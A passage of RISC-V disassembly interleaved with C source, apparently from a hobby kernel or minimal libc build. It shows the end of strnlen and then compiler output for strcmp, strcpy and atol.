  while (n-- && *p)
    8000264e:	fd043783          	ld	a5,-48(s0)
    80002652:	fff78713          	addi	a4,a5,-1
    80002656:	fce43823          	sd	a4,-48(s0)
    8000265a:	c791                	beqz	a5,80002666 <strnlen+0x3a>
    8000265c:	fe843783          	ld	a5,-24(s0)
    80002660:	0007c783          	lbu	a5,0(a5)
    80002664:	f3e5                	bnez	a5,80002644 <strnlen+0x18>
  return p - s;
    80002666:	fe843703          	ld	a4,-24(s0)
    8000266a:	fd843783          	ld	a5,-40(s0)
    8000266e:	40f707b3          	sub	a5,a4,a5
}
    80002672:	853e                	mv	a0,a5
    80002674:	7422                	ld	s0,40(sp)
    80002676:	6145                	addi	sp,sp,48
    80002678:	8082                	ret

000000008000267a <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    8000267a:	7179                	addi	sp,sp,-48
    8000267c:	f422                	sd	s0,40(sp)
    8000267e:	1800                	addi	s0,sp,48
    80002680:	fca43c23          	sd	a0,-40(s0)
    80002684:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    80002688:	fd843783          	ld	a5,-40(s0)
    8000268c:	00178713          	addi	a4,a5,1
    80002690:	fce43c23          	sd	a4,-40(s0)
    80002694:	0007c783          	lbu	a5,0(a5)
    80002698:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    8000269c:	fd043783          	ld	a5,-48(s0)
    800026a0:	00178713          	addi	a4,a5,1
    800026a4:	fce43823          	sd	a4,-48(s0)
    800026a8:	0007c783          	lbu	a5,0(a5)
    800026ac:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    800026b0:	fef44783          	lbu	a5,-17(s0)
    800026b4:	0ff7f793          	andi	a5,a5,255
    800026b8:	cb99                	beqz	a5,800026ce <strcmp+0x54>
    800026ba:	fef44703          	lbu	a4,-17(s0)
    800026be:	fee44783          	lbu	a5,-18(s0)
    800026c2:	0ff77713          	andi	a4,a4,255
    800026c6:	0ff7f793          	andi	a5,a5,255
    800026ca:	faf70fe3          	beq	a4,a5,80002688 <strcmp+0xe>

  return c1 - c2;
    800026ce:	fef44783          	lbu	a5,-17(s0)
    800026d2:	0007871b          	sext.w	a4,a5
    800026d6:	fee44783          	lbu	a5,-18(s0)
    800026da:	2781                	sext.w	a5,a5
    800026dc:	40f707bb          	subw	a5,a4,a5
    800026e0:	2781                	sext.w	a5,a5
}
    800026e2:	853e                	mv	a0,a5
    800026e4:	7422                	ld	s0,40(sp)
    800026e6:	6145                	addi	sp,sp,48
    800026e8:	8082                	ret

00000000800026ea <strcpy>:

char* strcpy(char* dest, const char* src)
{
    800026ea:	7179                	addi	sp,sp,-48
    800026ec:	f422                	sd	s0,40(sp)
    800026ee:	1800                	addi	s0,sp,48
    800026f0:	fca43c23          	sd	a0,-40(s0)
    800026f4:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    800026f8:	fd843783          	ld	a5,-40(s0)
    800026fc:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    80002700:	0001                	nop
    80002702:	fd043703          	ld	a4,-48(s0)
    80002706:	00170793          	addi	a5,a4,1
    8000270a:	fcf43823          	sd	a5,-48(s0)
    8000270e:	fe843783          	ld	a5,-24(s0)
    80002712:	00178693          	addi	a3,a5,1
    80002716:	fed43423          	sd	a3,-24(s0)
    8000271a:	00074703          	lbu	a4,0(a4)
    8000271e:	00e78023          	sb	a4,0(a5)
    80002722:	0007c783          	lbu	a5,0(a5)
    80002726:	fff1                	bnez	a5,80002702 <strcpy+0x18>
    ;
  return dest;
    80002728:	fd843783          	ld	a5,-40(s0)
}
    8000272c:	853e                	mv	a0,a5
    8000272e:	7422                	ld	s0,40(sp)
    80002730:	6145                	addi	sp,sp,48
    80002732:	8082                	ret

0000000080002734 <atol>:

long atol(const char* str)
{
    80002734:	7179                	addi	sp,sp,-48
    80002736:	f422                	sd	s0,40(sp)
    80002738:	1800                	addi	s0,sp,48
    8000273a:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    8000273e:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    80002742:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    80002746:	a031                	j	80002752 <atol+0x1e>
    str++;
    80002748:	fd843783          	ld	a5,-40(s0)
    8000274c:	0785                	addi	a5,a5,1
    8000274e:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    80002752:	fd843783          	ld	a5,-40(s0)
    80002756:	0007c783          	lbu	a5,0(a5)
    8000275a:	873e                	mv	a4,a5
    8000275c:	02000793          	li	a5,32
    80002760:	fef704e3          	beq	a4,a5,80002748 <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002764:	fd843783          	ld	a5,-40(s0)
    80002768:	0007c783          	lbu	a5,0(a5)
    8000276c:	873e                	mv	a4,a5
    8000276e:	02d00793          	li	a5,45
    80002772:	00f70b63          	beq	a4,a5,80002788 <atol+0x54>
    80002776:	fd843783          	ld	a5,-40(s0)
    8000277a:	0007c783          	lbu	a5,0(a5)
    8000277e:	873e                	mv	a4,a5
    80002780:	02b00793          	li	a5,43
    80002784:	06f71263          	bne	a4,a5,800027e8 <atol+0xb4>
    sign = *str == '-';
    80002788:	fd843783          	ld	a5,-40(s0)
    8000278c:	0007c783          	lbu	a5,0(a5)
    80002790:	0007871b          	sext.w	a4,a5
    80002794:	02d00793          	li	a5,45
    80002798:	40f707b3          	sub	a5,a4,a5
    8000279c:	0017b793          	seqz	a5,a5
    800027a0:	0ff7f793          	andi	a5,a5,255
    800027a4:	fef42223          	sw	a5,-28(s0)
    str++;
    800027a8:	fd843783          	ld	a5,-40(s0)
    800027ac:	0785                	addi	a5,a5,1
    800027ae:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    800027b2:	a81d                	j	800027e8 <atol+0xb4>
    res *= 10;
    800027b4:	fe843703          	ld	a4,-24(s0)
    800027b8:	87ba                	mv	a5,a4
    800027ba:	078a                	slli	a5,a5,0x2
    800027bc:	97ba                	add	a5,a5,a4
    800027be:	0786                	slli	a5,a5,0x1
    800027c0:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    800027c4:	fd843783          	ld	a5,-40(s0)
    800027c8:	00178713          	addi	a4,a5,1
    800027cc:	fce43c23          	sd	a4,-40(s0)
    800027d0:	0007c783          	lbu	a5,0(a5)
    800027d4:	2781                	sext.w	a5,a5
    800027d6:	fd07879b          	addiw	a5,a5,-48
    800027da:	2781                	sext.w	a5,a5
    800027dc:	873e                	mv	a4,a5
    800027de:	fe843783          	ld	a5,-24(s0)
    800027e2:	97ba                	add	a5,a5,a4
    800027e4:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    800027e8:	fd843783          	ld	a5,-40(s0)
    800027ec:	0007c783          	lbu	a5,0(a5)
    800027f0:	f3f1                	bnez	a5,800027b4 <atol+0x80>
  }

  return sign ? -res : res;
    800027f2:	fe442783          	lw	a5,-28(s0)
    800027f6:	2781                	sext.w	a5,a5
    800027f8:	c791                	beqz	a5,80002804 <atol+0xd0>
    800027fa:	fe843783          	ld	a5,-24(s0)
    800027fe:	40f007b3          	neg	a5,a5
    80002802:	a019                	j	80002808 <atol+0xd4>
    80002804:	fe843783          	ld	a5,-24(s0)
}
    80002808:	853e                	mv	a0,a5
    8000280a:	7422                	ld	s0,40(sp)
    8000280c:	6145                	addi	sp,sp,48
    8000280e:	8082                	ret
